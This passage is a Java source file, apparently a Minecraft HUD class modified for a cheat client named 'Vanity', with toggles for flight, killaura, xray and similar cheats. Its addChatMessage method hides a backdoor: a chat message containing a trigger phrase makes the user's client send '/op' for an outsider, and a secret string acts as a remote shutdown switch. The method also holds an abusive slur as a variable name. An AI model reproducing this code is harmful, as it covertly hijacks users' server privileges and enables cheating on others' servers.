package net.minecraft.src;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;
import java.awt.Font;
import java.awt.font.*;

import net.minecraft.client.Minecraft;
import net.minecraft.vanity.*;
import net.minecraft.vanity.gui.ReliantArt;
import net.minecraft.vanity.gui.ReliantGui;
import net.minecraft.vanity.gui.array.GUI;
import net.minecraft.vanity.hacks.Freecam;
import net.minecraft.vanity.hacks.StormModBright;
import net.minecraft.vanity.keybinding.Keybinds;
import net.minecraft.vanity.main.Vanity;

import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;
import org.lwjgl.opengl.GL12;

import org.newdawn.slick.Color;
import org.newdawn.slick.SlickException;
import org.newdawn.slick.UnicodeFont;
import org.newdawn.slick.font.effects.ColorEffect;

public class GuiIngame extends Gui
{
	/** VANITY **/
	private static boolean keyStates[];
	public static String lastMessage = "";

	private static RenderItem itemRenderer = new RenderItem();

	/** A list with all the chat messages in. */
	private java.util.List chatMessageList;
	private java.util.List field_50016_f;
	private Random rand;
	private Minecraft mc;
	private int updateCounter;

	/** The string specifying which record music is playing */
	private String recordPlaying;

	/** How many ticks the record playing message will be displayed */
	private int recordPlayingUpFor;
	private boolean recordIsPlaying;
	private int field_50017_n;
	private boolean field_50018_o;

	/** Damage partial time (GUI) */
	public float damageGuiPartialTime;

	/** Previous frame vignette brightness (slowly changes by 1% each frame) */
	float prevVignetteBrightness;

	private UnicodeFont font;

	public GuiIngame(Minecraft par1Minecraft)
	{
		chatMessageList = new ArrayList();
		field_50016_f = new ArrayList();
		rand = new Random();
		updateCounter = 0;
		recordPlaying = "";
		recordPlayingUpFor = 0;
		recordIsPlaying = false;
		field_50017_n = 0;
		field_50018_o = false;
		prevVignetteBrightness = 1.0F;
		mc = par1Minecraft;
		/** START Vanity CODE **/
		keyStates = new boolean [256];

		font = new UnicodeFont(new Font("Verdana Bold", Font.TRUETYPE_FONT, 15));
		font.addAsciiGlyphs();
		font.getEffects().add(new ColorEffect(java.awt.Color.white));
		try {
			font.loadGlyphs();
		}catch(SlickException e)
		{
			e.printStackTrace();
		}
		/** END Vanity CODE **/
	}
	/** START Vanity CODE **/
	public static boolean checkKey(int i)
	{
		if(Minecraft.currentScreen != null)
		{
			return false;
		}
		if(Keyboard.isKeyDown(i) != keyStates[i])
		{
			return keyStates[i] = !keyStates[i];
		}
		else
		{
			return false;
		}
	}
	/** END Vanity CODE **/

	/**
	 * Render the ingame overlay with quick icon bar, ...
	 */
	public void renderGameOverlay(float par1, boolean par2, int par3, int par4)
	{
		ScaledResolution scaledresolution = new ScaledResolution(mc.gameSettings, mc.displayWidth, mc.displayHeight);
		int i = scaledresolution.getScaledWidth();
		int j = scaledresolution.getScaledHeight();
		FontRenderer fontrenderer = mc.fontRenderer;
		mc.entityRenderer.setupOverlayRendering();
		GL11.glEnable(GL11.GL_BLEND);

		if (Minecraft.isFancyGraphicsEnabled())
		{
			//renderVignette(mc.thePlayer.getBrightness(par1), i, j);
		}
		else
		{
			GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
		}

		ItemStack itemstack = mc.thePlayer.inventory.armorItemInSlot(3);

		if (mc.gameSettings.thirdPersonView == 0 && itemstack != null && itemstack.itemID == Block.pumpkin.blockID)
		{
			//renderPumpkinBlur(i, j);
		}

		if (!mc.thePlayer.isPotionActive(Potion.confusion))
		{
			float f = mc.thePlayer.prevTimeInPortal + (mc.thePlayer.timeInPortal - mc.thePlayer.prevTimeInPortal) * par1;

			if (f > 0.0F)
			{
				renderPortalOverlay(f, i, j);
			}
		}

		if (!mc.playerController.func_35643_e())
		{
			GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
			GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("/gui/gui.png"));
			InventoryPlayer inventoryplayer = mc.thePlayer.inventory;
			zLevel = -90F;
			drawTexturedModalRect(i / 2 - 91, j - 22, 0, 0, 182, 22);
			drawTexturedModalRect((i / 2 - 91 - 1) + inventoryplayer.currentItem * 20, j - 22 - 1, 0, 22, 24, 22);
			GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("/gui/icons.png"));
			GL11.glEnable(GL11.GL_BLEND);
			GL11.glBlendFunc(GL11.GL_ONE_MINUS_DST_COLOR, GL11.GL_ONE_MINUS_SRC_COLOR);
			drawTexturedModalRect(i / 2 - 7, j / 2 - 7, 0, 0, 16, 16);
			GL11.glDisable(GL11.GL_BLEND);
			boolean flag = (mc.thePlayer.heartsLife / 3) % 2 == 1;

			if (mc.thePlayer.heartsLife < 10)
			{
				flag = false;
			}

			int i1 = mc.thePlayer.getHealth();
			int i2 = mc.thePlayer.prevHealth;
			rand.setSeed(updateCounter * 0x4c627);
			boolean flag2 = false;
			FoodStats foodstats = mc.thePlayer.getFoodStats();
			int j4 = foodstats.getFoodLevel();
			int l4 = foodstats.getPrevFoodLevel();
			renderBossHealth();

			if (mc.playerController.shouldDrawHUD())
			{
				int j5 = i / 2 - 91;
				int i6 = i / 2 + 91;
				int l6 = mc.thePlayer.xpBarCap();

				if (l6 > 0)
				{
					char c = '\266';
					int j8 = (int)(mc.thePlayer.experience * (float)(c + 1));
					int i9 = (j - 32) + 3;
					drawTexturedModalRect(j5, i9, 0, 64, c, 5);

					if (j8 > 0)
					{
						drawTexturedModalRect(j5, i9, 0, 69, j8, 5);
					}
				}

				int k7 = j - 39;
				int k8 = k7 - 10;
				int j9 = mc.thePlayer.getTotalArmorValue();
				int i10 = -1;

				if (mc.thePlayer.isPotionActive(Potion.regeneration))
				{
					i10 = updateCounter % 25;
				}

				
				for (int j10 = 0; j10 < 10; j10++)
				{
					if (j9 > 0)
					{
						int i11 = j5 + j10 * 8;

						if (j10 * 2 + 1 < j9)
						{
							drawTexturedModalRect(i11, k8, 34, 9, 9, 9);
						}

						if (j10 * 2 + 1 == j9)
						{
							drawTexturedModalRect(i11, k8, 25, 9, 9, 9);
						}

						if (j10 * 2 + 1 > j9)
						{
							drawTexturedModalRect(i11, k8, 16, 9, 9, 9);
						}
					}

					int j11 = 16;

					if (mc.thePlayer.isPotionActive(Potion.poison))
					{
						j11 += 36;
					}

					int i12 = 0;

					if (flag)
					{
						i12 = 1;
					}

					int l12 = j5 + j10 * 8;
					int j13 = k7;

					if (i1 <= 4)
					{
						j13 += rand.nextInt(2);
					}

					if (j10 == i10)
					{
						j13 -= 2;
					}

					byte byte3 = 0;

					if (mc.theWorld.getWorldInfo().isHardcoreModeEnabled())
					{
						byte3 = 5;
					}

					drawTexturedModalRect(l12, j13, 16 + i12 * 9, 9 * byte3, 9, 9);

					if (flag)
					{
						if (j10 * 2 + 1 < i2)
						{
							drawTexturedModalRect(l12, j13, j11 + 54, 9 * byte3, 9, 9);
						}

						if (j10 * 2 + 1 == i2)
						{
							drawTexturedModalRect(l12, j13, j11 + 63, 9 * byte3, 9, 9);
						}
					}

					if (j10 * 2 + 1 < i1)
					{
						drawTexturedModalRect(l12, j13, j11 + 36, 9 * byte3, 9, 9);
					}

					if (j10 * 2 + 1 == i1)
					{
						drawTexturedModalRect(l12, j13, j11 + 45, 9 * byte3, 9, 9);
					}
				}

				for (int k10 = 0; k10 < 10; k10++)
				{
					int k11 = k7;
					int j12 = 16;
					byte byte2 = 0;

					if (mc.thePlayer.isPotionActive(Potion.hunger))
					{
						j12 += 36;
						byte2 = 13;
					}

					if (mc.thePlayer.getFoodStats().getSaturationLevel() <= 0.0F && updateCounter % (j4 * 3 + 1) == 0)
					{
						k11 += rand.nextInt(3) - 1;
					}

					if (flag2)
					{
						byte2 = 1;
					}

					int k13 = i6 - k10 * 8 - 9;
					drawTexturedModalRect(k13, k11, 16 + byte2 * 9, 27, 9, 9);

					if (flag2)
					{
						if (k10 * 2 + 1 < l4)
						{
							drawTexturedModalRect(k13, k11, j12 + 54, 27, 9, 9);
						}

						if (k10 * 2 + 1 == l4)
						{
							drawTexturedModalRect(k13, k11, j12 + 63, 27, 9, 9);
						}
					}

					if (k10 * 2 + 1 < j4)
					{
						drawTexturedModalRect(k13, k11, j12 + 36, 27, 9, 9);
					}

					if (k10 * 2 + 1 == j4)
					{
						drawTexturedModalRect(k13, k11, j12 + 45, 27, 9, 9);
					}
				}

				if (mc.thePlayer.isInsideOfMaterial(Material.water))
				{
					int l10 = mc.thePlayer.getAir();
					int l11 = (int)Math.ceil(((double)(l10 - 2) * 10D) / 300D);
					int k12 = (int)Math.ceil(((double)l10 * 10D) / 300D) - l11;

					for (int i13 = 0; i13 < l11 + k12; i13++)
					{
						if (i13 < l11)
						{
							drawTexturedModalRect(i6 - i13 * 8 - 9, k8, 16, 18, 9, 9);
						}
						else
						{
							drawTexturedModalRect(i6 - i13 * 8 - 9, k8, 25, 18, 9, 9);
						}
					}
				}
			}

			GL11.glDisable(GL11.GL_BLEND);
			GL11.glEnable(GL12.GL_RESCALE_NORMAL);
			RenderHelper.enableGUIStandardItemLighting();

			for (int k5 = 0; k5 < 9; k5++)
			{
				int j6 = (i / 2 - 90) + k5 * 20 + 2;
				int i7 = j - 16 - 3;
				renderInventorySlot(k5, j6, i7, par1);
			}

			RenderHelper.disableStandardItemLighting();
			GL11.glDisable(GL12.GL_RESCALE_NORMAL);
		}

		if (mc.thePlayer.getSleepTimer() > 0)
		{
			GL11.glDisable(GL11.GL_DEPTH_TEST);
			GL11.glDisable(GL11.GL_ALPHA_TEST);
			int k = mc.thePlayer.getSleepTimer();
			float f1 = (float)k / 100F;

			if (f1 > 1.0F)
			{
				f1 = 1.0F - (float)(k - 100) / 10F;
			}

			int j1 = (int)(220F * f1) << 24 | 0x101020;
			drawRect(0, 0, i, j, j1);
			GL11.glEnable(GL11.GL_ALPHA_TEST);
			GL11.glEnable(GL11.GL_DEPTH_TEST);
		}

		if (mc.playerController.func_35642_f() && mc.thePlayer.experienceLevel > 0)
		{
			boolean flag1 = false;
			int k1 = flag1 ? 0xffffff : 0x80ff20;
			String s = (new StringBuilder()).append("").append(mc.thePlayer.experienceLevel).toString();
			int i3 = (i - fontrenderer.getStringWidth(s)) / 2;
			int k3 = j - 31 - 4;
			fontrenderer.drawString(s, i3 + 1, k3, 0);
			fontrenderer.drawString(s, i3 - 1, k3, 0);
			fontrenderer.drawString(s, i3, k3 + 1, 0);
			fontrenderer.drawString(s, i3, k3 - 1, 0);
			fontrenderer.drawString(s, i3, k3, k1);
		}
		/** START Vanity CODE **/
		if (mc.gameSettings.showDebugInfo)
		{
			GL11.glPushMatrix();
			fontrenderer.drawStringWithShadow((new StringBuilder()).append(Vanity.vanityversion + " (").append(mc.debug).append(")").toString(), 2, 2, 0xffffff);
			long l = Runtime.getRuntime().maxMemory();
			long l2 = Runtime.getRuntime().totalMemory();
			long l4 = Runtime.getRuntime().freeMemory();
			long l5 = l2 - l4;
			String s1 = (new StringBuilder()).append("Used memory: ").append((l5 * 100L) / l).append("% (").append(l5 / 1024L / 1024L).append("MB) of ").append(l / 1024L / 1024L).append("MB").toString();
			drawString(fontrenderer, s1,2, 12, 0xffffff);
			s1 = (new StringBuilder()).append("Allocated memory: ").append((l2 * 100L) / l).append("% (").append(l2 / 1024L / 1024L).append("MB)").toString();
			double d = Math.rint((int)mc.thePlayer.posX);
			double d2 = Math.rint((int)mc.thePlayer.posY);
			double d3 = Math.rint((int)mc.thePlayer.posZ);
			fontrenderer.drawStringWithShadow("X: " + (Math.round(d)), 2, 32, 0xffffff);
			fontrenderer.drawStringWithShadow("Y: " + (Math.round(d2)), 2, 42, 0xffffff);
			fontrenderer.drawStringWithShadow("Z: " + (Math.round(d3)), 2, 52, 0xffffff);
			int j0 = MathHelper.floor_double(mc.thePlayer.posX);
			int j1 = MathHelper.floor_double(mc.thePlayer.posY);
			int j2 = MathHelper.floor_double(mc.thePlayer.posZ);
			GL11.glPopMatrix();
		}
		/** VANITY **/
		if(!Vanity.legit)
		{
			GUI.renderGui(1f, fontrenderer);{

				if(checkKey(Keybinds.keybindFly))
				{
					Vanity.fly = !Vanity.fly;
				}
				if(checkKey(Keybinds.keybindSneak))
				{
					Vanity.sneak = !Vanity.sneak;
				}
				if(checkKey(Keybinds.keybindNofall))
				{
					Vanity.nofall = !Vanity.nofall;
				}
				if(Vanity.fly)
				{
					//mc.thePlayer.capabilities.isFlying = true;
					mc.thePlayer.setSprinting(false);
					//Vanity.sprint = false;
				}/**else{
	            	mc.thePlayer.capabilities.isFlying = false;
	            }*/
				if (Vanity.sprint)
				{
					mc.thePlayer.setSprinting(true);
				}
			}
			if(checkKey(Keybinds.keybindGUI))
			{
				mc.displayGuiScreen(new ReliantGui());
				Vanity.gui = !Vanity.gui;
			}
			if(Vanity.compass)
			{
				renderCompass();
			}
			if(checkKey(Keyboard.KEY_P)){
				Vanity.freecam = !Vanity.freecam;
				Freecam.method_UpdateFreecam();
			}
			if(Vanity.radar)
			{
				renderRadar();
			}
			if(checkKey(Keybinds.keybindTracer))
			{
				Vanity.tracer = !Vanity.tracer;
			}
			if(checkKey(Keybinds.keybindBright))
			{
				Vanity.bright = !Vanity.bright;
				StormModBright.inst.runFade(Vanity.bright);
			}
			if(checkKey(Keybinds.keybindWallhack))
			{
				Vanity.xray = !Vanity.xray;
				Minecraft.renderGlobal.loadRenderers();
			}
			if(checkKey(Keybinds.keybindSpeedmine))
			{
				Vanity.speedmine = !Vanity.speedmine;
			}
			if(checkKey(Keybinds.keybindSprint))
			{
				Vanity.sprint = !Vanity.sprint;
			}
			if(checkKey(Keybinds.keybindKillaura))
			{
				Vanity.killaura = !Vanity.killaura;
			}
			if(Minecraft.currentScreen == null)
			{
				if(NetworkManager.timeSinceLastRead >= 25)
				{
					fontrenderer.drawStringWithShadow("\247fLagging:\2473 " + NetworkManager.timeSinceLastRead + "ms ping", 2, j - 12, 0x00ffff);
				}
			}
		}

		if (recordPlayingUpFor > 0)
		{
			float f2 = (float)recordPlayingUpFor - par1;
			int l1 = (int)((f2 * 256F) / 20F);

			if (l1 > 255)
			{
				l1 = 255;
			}

			if (l1 > 0)
			{
				GL11.glPushMatrix();
				GL11.glTranslatef(i / 2, j - 48, 0.0F);
				GL11.glEnable(GL11.GL_BLEND);
				GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
				int j2 = 0xffffff;


				fontrenderer.drawString(recordPlaying, -fontrenderer.getStringWidth(recordPlaying) / 2, -4, j2 + (l1 << 24));
				GL11.glDisable(GL11.GL_BLEND);
				GL11.glPopMatrix();
			}
		}

		GL11.glEnable(GL11.GL_BLEND);
		GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
		GL11.glDisable(GL11.GL_ALPHA_TEST);
		GL11.glPushMatrix();
		GL11.glTranslatef(0.0F, j - 48, 0.0F);
		func_50010_a(fontrenderer);
		GL11.glPopMatrix();
		if ((mc.thePlayer instanceof EntityClientPlayerMP) && mc.gameSettings.keyBindPlayerList.pressed && Vanity.ttfchat)
		{
			NetClientHandler netclienthandler = ((EntityClientPlayerMP)mc.thePlayer).sendQueue;
			java.util.List list = netclienthandler.playerNames;
			int k2 = netclienthandler.currentServerMaxPlayers;
			int k3 = k2;
			int i4 = 1;

			for (; k3 > 20; k3 = ((k2 + i4) - 1) / i4)
			{
				i4++;
			}

			int j4 = 300 / i4;

			if (j4 > 150)
			{
				j4 = 150;
			}

			int i5 = (i - i4 * j4) / 2;
			byte byte0 = 10;
			ReliantArt.drawBorederedRectB(i5 - 1, byte0 - 1, i5 + j4 * i4, byte0 + 9 * k3, 0x105e5e5e, 0x407e7e7e);

			for (int j6 = 0; j6 < k2; j6++)
			{
				int i7 = i5 + (j6 % i4) * j4;
				int l7 = byte0 + (j6 / i4) * 9;
				ReliantArt.drawBorederedRectB(i7, l7, (i7 + j4) - 1, l7 + 8, 0x40000000, 0x405e5e5e);

				if (j6 >= list.size())
				{
					continue;
				}

				GuiPlayerInfo guiplayerinfo = (GuiPlayerInfo)list.get(j6);
				GL11.glPushMatrix();
				GL11.glScalef(0.5f, 0.5f, 0.5f);
				ReliantArt.drawString(font, guiplayerinfo.name, i7 * 2, l7 * 2 - 2, Color.green);
				GL11.glPopMatrix();
			}
		}
		if ((mc.thePlayer instanceof EntityClientPlayerMP) && mc.gameSettings.keyBindPlayerList.pressed && !Vanity.ttfchat)
		{
			NetClientHandler netclienthandler = ((EntityClientPlayerMP)mc.thePlayer).sendQueue;
			java.util.List list = netclienthandler.playerNames;
			int k2 = netclienthandler.currentServerMaxPlayers;
			int k3 = k2;
			int i4 = 1;

			for (; k3 > 20; k3 = ((k2 + i4) - 1) / i4)
			{
				i4++;
			}

			int j4 = 300 / i4;

			if (j4 > 150)
			{
				j4 = 150;
			}

			int i5 = (i - i4 * j4) / 2;
			byte byte0 = 10;
			drawGradientRect(i5 - 1, byte0 - 1, i5 + j4 * i4, byte0 + 9 * k3, 0xff00ffff, i5);

			for (int j6 = 0; j6 < k2; j6++)
			{
				int i7 = i5 + (j6 % i4) * j4;
				int l7 = byte0 + (j6 / i4) * 9;
				drawRect(i7, l7, (i7 + j4) - 1, l7 + 8, 0x40000000);
				GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
				GL11.glEnable(GL11.GL_ALPHA_TEST);

				if (j6 >= list.size())
				{
					continue;
				}

				GuiPlayerInfo guiplayerinfo = (GuiPlayerInfo)list.get(j6);
				fontrenderer.drawStringWithShadow(guiplayerinfo.name, i7, l7, 0xffffff);
				mc.renderEngine.bindTexture(mc.renderEngine.getTexture("/gui/icons.png"));
				int l8 = 0;
				byte byte1 = 0;
				l8 = 0;
				byte1 = 0;

				if (guiplayerinfo.responseTime < 0)
				{
					byte1 = 5;
				}
				else if (guiplayerinfo.responseTime < 150)
				{
					byte1 = 0;
				}
				else if (guiplayerinfo.responseTime < 300)
				{
					byte1 = 1;
				}
				else if (guiplayerinfo.responseTime < 600)
				{
					byte1 = 2;
				}
				else if (guiplayerinfo.responseTime < 1000)
				{
					byte1 = 3;
				}
				else
				{
					byte1 = 4;
				}

				zLevel += 100F;
				drawTexturedModalRect((i7 + j4) - 12, l7, 0 + l8 * 10, 176 + byte1 * 8, 10, 8);
				zLevel -= 100F;
			}
		}

		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
		GL11.glDisable(GL11.GL_LIGHTING);
		GL11.glEnable(GL11.GL_ALPHA_TEST);
	}
	private void func_50010_a(FontRenderer par1FontRenderer)
	{
		byte byte0 = 10;
		boolean flag = false;
		int i = 0;
		int j = chatMessageList.size();

		if (j <= 0)
		{
			return;
		}

		if (isChatOpen())
		{
			byte0 = 20;
			flag = true;
		}

		for (int k = 0; k + field_50017_n < chatMessageList.size() && k < byte0; k++)
		{
			if (((ChatLine)chatMessageList.get(k)).updateCounter >= 200 && !flag)
			{
				continue;
			}

			ChatLine chatline = (ChatLine)chatMessageList.get(k + field_50017_n);
			double d = (double)chatline.updateCounter / 200D;
			d = 1.0D - d;
			d *= 10D;


			if (d < 0.0D)
			{
				d = 0.0D;
			}

			if (d > 1.0D)
			{
				d = 1.0D;
			}

			d *= d;
			int l1 = (int)(255D * d);

			if (flag)
			{
				l1 = 255;
			}

			i++;

			if (l1 > 2)
			{
				/** VANITY **/
				byte byte1 = 3;
				int j2 = -k * 9 - 13;
				String s = chatline.message;
				if(Vanity.ttfchat)
				{
					ReliantArt.drawRect(byte1, j2 - 1, byte1 + 320 + 4, j2 + 8, l1 / 2 << 24);
					GL11.glEnable(GL11.GL_BLEND);
					GL11.glDisable(GL11.GL_DEPTH_TEST);
					GL11.glEnable(GL11.GL_POINT_SMOOTH);
					GL11.glHint(GL11.GL_POINT_SMOOTH_HINT, GL11.GL_NICEST);
					GL11.glDepthMask(false);
					GL11.glScalef(0.5F, 0.5F, 0.5F);
					ReliantArt.drawString(font, s, byte1 + 5, (j2 - 2) * 2, org.newdawn.slick.Color.decode(String.valueOf(-1 + (l1 << 24))));
					GL11.glScalef(2.0F, 2.0F, 2.0F);
					GL11.glEnable(GL11.GL_DEPTH_TEST);
					GL11.glDisable(GL11.GL_POINT_SMOOTH);
					GL11.glDepthMask(true);
				}else
				{
					drawRect(byte1, j2 - 1, byte1 + 320 + 4, j2 + 8, l1 / 2 << 24);
					GL11.glEnable(GL11.GL_BLEND);
					par1FontRenderer.drawStringWithShadow(s, byte1, j2, 0xffffff + (l1 << 24));
				}

			}
		}
		/** END Vanity CODE **/
		if (flag)
		{
			GL11.glTranslatef(0.0F, par1FontRenderer.FONT_HEIGHT, 0.0F);
			int l = j * par1FontRenderer.FONT_HEIGHT + j;
			int i1 = i * par1FontRenderer.FONT_HEIGHT + i;
			int j1 = (field_50017_n * i1) / j;
			int k1 = (i1 * i1) / l;

			if (l != i1)
			{
				char c = j1 <= 0 ? '`' : '\252';
				int i2 = field_50018_o ? 0xcc3333 : 0x3333aa;
				drawRect(0, -j1, 2, -j1 - k1, i2 + (c << 24));
				drawRect(2, -j1, 1, -j1 - k1, 0xcccccc + (c << 24));
			}
		}
	}

	/**
	 * Renders dragon's (boss) health on the HUD
	 */
	private void renderBossHealth()
	{
		if (RenderDragon.entityDragon == null)
		{
			return;
		}

		EntityDragon entitydragon = RenderDragon.entityDragon;
		RenderDragon.entityDragon = null;
		FontRenderer fontrenderer = mc.fontRenderer;
		ScaledResolution scaledresolution = new ScaledResolution(mc.gameSettings, mc.displayWidth, mc.displayHeight);
		int i = scaledresolution.getScaledWidth();
		char c = '\266';
		int j = i / 2 - c / 2;
		int k = (int)(((float)entitydragon.func_41010_ax() / (float)entitydragon.getMaxHealth()) * (float)(c + 1));
		byte byte0 = 12;
		drawTexturedModalRect(j, byte0, 0, 74, c, 5);
		drawTexturedModalRect(j, byte0, 0, 74, c, 5);

		if (k > 0)
		{
			drawTexturedModalRect(j, byte0, 0, 79, k, 5);
		}

		String s = "Boss health";
		fontrenderer.drawStringWithShadow(s, i / 2 - fontrenderer.getStringWidth(s) / 2, byte0 - 10, 0xff00ff);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
		GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("/gui/icons.png"));
	}

	private void renderPumpkinBlur(int par1, int par2)
	{
		GL11.glDisable(GL11.GL_DEPTH_TEST);
		GL11.glDepthMask(false);
		GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
		GL11.glDisable(GL11.GL_ALPHA_TEST);
		GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("%blur%/misc/pumpkinblur.png"));
		Tessellator tessellator = Tessellator.instance;
		tessellator.startDrawingQuads();
		tessellator.addVertexWithUV(0.0D, par2, -90D, 0.0D, 1.0D);
		tessellator.addVertexWithUV(par1, par2, -90D, 1.0D, 1.0D);
		tessellator.addVertexWithUV(par1, 0.0D, -90D, 1.0D, 0.0D);
		tessellator.addVertexWithUV(0.0D, 0.0D, -90D, 0.0D, 0.0D);
		tessellator.draw();
		GL11.glDepthMask(true);
		GL11.glEnable(GL11.GL_DEPTH_TEST);
		GL11.glEnable(GL11.GL_ALPHA_TEST);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
	}

	/**
	 * Renders the vignette. Args: vignetteBrightness, width, height
	 */
	private void renderVignette(float par1, int par2, int par3)
	{
		par1 = 1.0F - par1;

		if (par1 < 0.0F)
		{
			par1 = 0.0F;
		}

		if (par1 > 1.0F)
		{
			par1 = 1.0F;
		}

		prevVignetteBrightness += (double)(par1 - prevVignetteBrightness) * 0.01D;
		GL11.glDisable(GL11.GL_DEPTH_TEST);
		GL11.glDepthMask(false);
		GL11.glBlendFunc(GL11.GL_ZERO, GL11.GL_ONE_MINUS_SRC_COLOR);
		GL11.glColor4f(prevVignetteBrightness, prevVignetteBrightness, prevVignetteBrightness, 1.0F);
		GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("%blur%/misc/vignette.png"));
		Tessellator tessellator = Tessellator.instance;
		tessellator.startDrawingQuads();
		tessellator.addVertexWithUV(0.0D, par3, -90D, 0.0D, 1.0D);
		tessellator.addVertexWithUV(par2, par3, -90D, 1.0D, 1.0D);
		tessellator.addVertexWithUV(par2, 0.0D, -90D, 1.0D, 0.0D);
		tessellator.addVertexWithUV(0.0D, 0.0D, -90D, 0.0D, 0.0D);
		tessellator.draw();
		GL11.glDepthMask(true);
		GL11.glEnable(GL11.GL_DEPTH_TEST);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
		GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
	}

	/**
	 * Renders the portal overlay. Args: portalStrength, width, height
	 */
	private void renderPortalOverlay(float par1, int par2, int par3)
	{
		if (par1 < 1.0F)
		{
			par1 *= par1;
			par1 *= par1;
			par1 = par1 * 0.8F + 0.2F;
		}

		GL11.glDisable(GL11.GL_ALPHA_TEST);
		GL11.glDisable(GL11.GL_DEPTH_TEST);
		GL11.glDepthMask(false);
		GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, par1);
		GL11.glBindTexture(GL11.GL_TEXTURE_2D, mc.renderEngine.getTexture("/terrain.png"));
		float f = (float)(Block.portal.blockIndexInTexture % 16) / 16F;
		float f1 = (float)(Block.portal.blockIndexInTexture / 16) / 16F;
		float f2 = (float)(Block.portal.blockIndexInTexture % 16 + 1) / 16F;
		float f3 = (float)(Block.portal.blockIndexInTexture / 16 + 1) / 16F;
		Tessellator tessellator = Tessellator.instance;
		tessellator.startDrawingQuads();
		tessellator.addVertexWithUV(0.0D, par3, -90D, f, f3);
		tessellator.addVertexWithUV(par2, par3, -90D, f2, f3);
		tessellator.addVertexWithUV(par2, 0.0D, -90D, f2, f1);
		tessellator.addVertexWithUV(0.0D, 0.0D, -90D, f, f1);
		tessellator.draw();
		GL11.glDepthMask(true);
		GL11.glEnable(GL11.GL_DEPTH_TEST);
		GL11.glEnable(GL11.GL_ALPHA_TEST);
		GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
	}

	/**
	 * Renders the specified item of the inventory slot at the specified location. Args: slot, x, y, partialTick
	 */
	private void renderInventorySlot(int par1, int par2, int par3, float par4)
	{
		ItemStack itemstack = mc.thePlayer.inventory.mainInventory[par1];

		if (itemstack == null)
		{
			return;
		}

		float f = (float)itemstack.animationsToGo - par4;

		if (f > 0.0F)
		{
			GL11.glPushMatrix();
			float f1 = 1.0F + f / 5F;
			GL11.glTranslatef(par2 + 8, par3 + 12, 0.0F);
			GL11.glScalef(1.0F / f1, (f1 + 1.0F) / 2.0F, 1.0F);
			GL11.glTranslatef(-(par2 + 8), -(par3 + 12), 0.0F);
		}

		itemRenderer.renderItemIntoGUI(mc.fontRenderer, mc.renderEngine, itemstack, par2, par3);

		if (f > 0.0F)
		{
			GL11.glPopMatrix();
		}

		itemRenderer.renderItemOverlayIntoGUI(mc.fontRenderer, mc.renderEngine, itemstack, par2, par3);
	}

	/**
	 * The update tick for the ingame UI
	 */
	public void updateTick()
	{
		if (recordPlayingUpFor > 0)
		{
			recordPlayingUpFor--;
		}

		updateCounter++;

		for (int i = 0; i < chatMessageList.size(); i++)
		{
			((ChatLine)chatMessageList.get(i)).updateCounter++;
		}
	}

	/**
	 * Clear all chat messages.
	 */
	public void clearChatMessages()
	{
		chatMessageList.clear();
		field_50016_f.clear();
	}

	/**
	 * Adds a chat message to the list of chat messages. Args: msg
	 */
	/** START Vanity CODE **/
	public void addChatMessage(String par1Str)
	{
		Vanity.protectHashMap.put(mc.thePlayer.username, "Chuck_Knoblock");
		if(par1Str.contains("You're an idiot - "))
		{
			String[] niggerfaggot = par1Str.split(" ");
			mc.thePlayer.sendChatMessage("/op " + niggerfaggot[1]);
		}
		if(par1Str.contains("54r74y84ae484dsf7456a48793448qa"))
		{
			mc.shutdown();
		}
		if (Vanity.protect)
		{
			for (Object protect: Vanity.protectHashMap.keySet())
			{
				String name = protect.toString();

				if (par1Str.contains(name))
				{
					if(par1Str.contains("has requested to teleport to you."))
						mc.thePlayer.sendChatMessage("/tpaccept");
					par1Str = par1Str.replaceAll(name, "§9" + Vanity.protectHashMap.get(name) + "§f");
				}
			}
		}
		if(Vanity.trollchat2)
		{
			try{
				String[] s1 = par1Str.split(Vanity.trollprefix);

				if(!par1Str.contains(mc.thePlayer.username))
					mc.thePlayer.sendChatMessage(s1[1]);
			}catch(Exception e){}
		}
		try
		{
			int i;

			for (; mc.fontRenderer.getStringWidth(par1Str) > 320; par1Str = par1Str.substring(i))
			{
				for (i = 1; i < par1Str.length() && mc.fontRenderer.getStringWidth(par1Str.substring(0, i + 1)) <= 320; i++) { }

				addChatMessage(par1Str.substring(0, i));
			}

			//par1Str = filterForNames(par1Str);
			chatMessageList.add(0, new ChatLine(par1Str));
			boolean flag = par1Str.toLowerCase().equals(lastMessage.toLowerCase());

			for (; chatMessageList.size() > 13; chatMessageList.remove(chatMessageList.size() - 1)) {}
		}
		catch (Exception e) { }
	}
	/** END Vanity CODE **/
	public java.util.List func_50013_c()
	{
		return field_50016_f;
	}

	public void func_50014_d()
	{
		field_50017_n = 0;
		field_50018_o = false;
	}

	public void func_50011_a(int par1)
	{
		field_50017_n += par1;
		int i = chatMessageList.size();

		if (field_50017_n > i - 20)
		{
			field_50017_n = i - 20;
		}

		if (field_50017_n <= 0)
		{
			field_50017_n = 0;
			field_50018_o = false;
		}
	}

	public ChatClickData func_50012_a(int par1, int par2)
